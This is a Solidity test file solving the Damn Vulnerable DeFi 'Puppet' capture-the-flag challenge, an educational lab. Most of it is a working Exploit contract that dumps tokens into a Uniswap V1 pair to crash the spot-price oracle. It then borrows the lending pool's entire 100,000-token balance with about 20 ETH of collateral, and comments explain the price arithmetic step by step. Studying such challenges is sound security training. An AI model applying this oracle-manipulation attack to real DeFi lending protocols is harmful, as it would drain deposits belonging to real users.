// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {PuppetPool} from "../../src/puppet/PuppetPool.sol";
import {IUniswapV1Exchange} from "../../src/puppet/IUniswapV1Exchange.sol";
import {IUniswapV1Factory} from "../../src/puppet/IUniswapV1Factory.sol";

contract PuppetChallenge is Test {
    address deployer = makeAddr("deployer");
    address recovery = makeAddr("recovery");
    address player;
    uint256 playerPrivateKey;

    uint256 constant UNISWAP_INITIAL_TOKEN_RESERVE = 10e18;
    uint256 constant UNISWAP_INITIAL_ETH_RESERVE = 10e18;
    uint256 constant PLAYER_INITIAL_TOKEN_BALANCE = 1000e18;
    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 25e18;
    uint256 constant POOL_INITIAL_TOKEN_BALANCE = 100_000e18;

    DamnValuableToken token;
    PuppetPool lendingPool;
    IUniswapV1Exchange uniswapV1Exchange;
    IUniswapV1Factory uniswapV1Factory;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        (player, playerPrivateKey) = makeAddrAndKey("player");

        startHoax(deployer);

        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);

        // Deploy a exchange that will be used as the factory template
        IUniswapV1Exchange uniswapV1ExchangeTemplate =
            IUniswapV1Exchange(deployCode(string.concat(vm.projectRoot(), "/builds/uniswap/UniswapV1Exchange.json")));

        // Deploy factory, initializing it with the address of the template exchange
        uniswapV1Factory = IUniswapV1Factory(deployCode("builds/uniswap/UniswapV1Factory.json"));
        uniswapV1Factory.initializeFactory(address(uniswapV1ExchangeTemplate));

        // Deploy token to be traded in Uniswap V1
        token = new DamnValuableToken();

        // Create a new exchange for the token
        uniswapV1Exchange = IUniswapV1Exchange(uniswapV1Factory.createExchange(address(token)));

        // Deploy the lending pool
        lendingPool = new PuppetPool(address(token), address(uniswapV1Exchange));

        // Add initial token and ETH liquidity to the pool
        token.approve(address(uniswapV1Exchange), UNISWAP_INITIAL_TOKEN_RESERVE);
        uniswapV1Exchange.addLiquidity{value: UNISWAP_INITIAL_ETH_RESERVE}(
            0, // min_liquidity
            UNISWAP_INITIAL_TOKEN_RESERVE,
            block.timestamp * 2 // deadline
        );

        token.transfer(player, PLAYER_INITIAL_TOKEN_BALANCE);
        token.transfer(address(lendingPool), POOL_INITIAL_TOKEN_BALANCE);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public {
        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);
        assertEq(uniswapV1Exchange.factoryAddress(), address(uniswapV1Factory));
        assertEq(uniswapV1Exchange.tokenAddress(), address(token));
        assertEq(
            uniswapV1Exchange.getTokenToEthInputPrice(1e18),
            _calculateTokenToEthInputPrice(1e18, UNISWAP_INITIAL_TOKEN_RESERVE, UNISWAP_INITIAL_ETH_RESERVE)
        );
        assertEq(lendingPool.calculateDepositRequired(1e18), 2e18);
        assertEq(lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE), POOL_INITIAL_TOKEN_BALANCE * 2);
    }

    /**
     * The core vulnerability lies in the PuppetPool’s reliance on the Uniswap pair’s spot price as an oracle, calculated by _computeOraclePrice().
     * This price is simply: price = (ETH balance in pair) / (token balance in pair)
     *
     * The Uniswap pair’s reserves can be manipulated by anyone trading with it.
     * Selling a large amount of tokens increases the token reserve and decreases the ETH reserve, crashing the token’s price.
     * Since calculateDepositRequired uses this price, a lower price reduces the ETH needed to borrow tokens, allowing an attacker to borrow large amounts with minimal collateral.
     * Initially:
     *
     * Uniswap reserves: 10 ETH, 10 tokens.
     * Price: 10e18 / 10e18 = 1e18 wei/token (1 ETH/token).
     * Deposit for 100,000 tokens: 2 * 100,000 * 1 = 200,000 ETH.
     * The player only has 25 ETH, making direct borrowing impossible. However, by manipulating the Uniswap reserves, the price can be lowered, reducing the deposit requirement.
     */
    function test_puppet() public checkSolvedByPlayer {
        // Player sends 25 ETH to the contract
        Exploit exploit =
            new Exploit{value: PLAYER_INITIAL_ETH_BALANCE}(token, lendingPool, uniswapV1Exchange, recovery);
        // Sends 1,000 tokens to exploit
        token.transfer(address(exploit), PLAYER_INITIAL_TOKEN_BALANCE);
        exploit.attack(POOL_INITIAL_TOKEN_BALANCE);
    }

    // Utility function to calculate Uniswap prices
    function _calculateTokenToEthInputPrice(uint256 tokensSold, uint256 tokensInReserve, uint256 etherInReserve)
        private
        pure
        returns (uint256)
    {
        return (tokensSold * 997 * etherInReserve) / (tokensInReserve * 1000 + tokensSold * 997);
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Player executed a single transaction
        assertEq(vm.getNonce(player), 1, "Player executed more than one tx");

        // All tokens of the lending pool were deposited into the recovery account
        assertEq(token.balanceOf(address(lendingPool)), 0, "Pool still has tokens");
        assertGe(token.balanceOf(recovery), POOL_INITIAL_TOKEN_BALANCE, "Not enough tokens in recovery account");
    }
}

contract Exploit {
    DamnValuableToken token;
    PuppetPool lendingPool;
    IUniswapV1Exchange uniswapV1Exchange;
    address recovery;

    constructor(
        DamnValuableToken _token,
        PuppetPool _lendingPool,
        IUniswapV1Exchange _uniswapV1Exchange,
        address _recovery
    ) payable {
        token = _token;
        lendingPool = _lendingPool;
        uniswapV1Exchange = _uniswapV1Exchange;
        recovery = _recovery;
    }

    function attack(uint256 exploitAmount) public {
        // current balance of DamnValuableToken
        uint256 tokenBalance = token.balanceOf(address(this));
        // Approves Uniswap to spend 1,000 tokens.
        token.approve(address(uniswapV1Exchange), tokenBalance);

        uniswapV1Exchange.tokenToEthTransferInput( // This is a Uniswap V1 function to swap tokens for ETH
            tokenBalance, // sells all the tokens it holds
            1, // This sets a minimum amount of ETH to receive, but it's set very low (1 wei) so the transaction doesn't revert due to slippage.
            block.timestamp, // deadline for the transaction
            address(this) // recipient. The ETH received from the swap is sent back to the exploit contract
        );

        // Sends 20 ETH to the lending pool as collateral to borrow 100,000 tokens
        lendingPool.borrow{value: 20e18}(exploitAmount, recovery);
    }

    /**
     * Price Manipulation Calculation
     * Before Sale:
     * Uniswap: 10 ETH, 10 tokens.
     * Price: 10e18 / 10e18 = 1e18 wei/token.
     *
     * Selling 1,000 Tokens:
     * Uniswap V1 fee: 0.3%, so 1000 * 0.997 = 997 tokens added to reserves.
     *
     * Constant product:
     * (token_reserve + tokens_sold * 0.997) * (eth_reserve - eth_received) = 10 * 10.
     * (10 + 997) * (10 - eth_received) = 100.
     * 1007 * (10 - eth_received) = 100.
     * 10 - eth_received = 100 / 1007 ≈ 0.0993.
     * eth_received ≈ 9.9007 ETH.
     *
     * New reserves: 1,007 tokens, ≈0.0993 ETH.
     *
     * New Price:
     * 0.0993e18 / 1007e18 ≈ 9.86e-5 ETH/token (9.86e13 wei/token).
     *
     * New Deposit Requirement:
     * For 100,000 tokens: 2 * 100,000 * 9.86e-5 ≈ 19.72 ETH.
     *
     * The exploit uses 20 ETH, slightly more than needed, which works.
     *
     * Outcome
     * The contract sells 1,000 tokens, receives ~9.9 ETH, and uses 20 of its 25 ETH to borrow 100,000 tokens, draining the pool. Tokens go to recovery.
     */
    receive() external payable {}
}
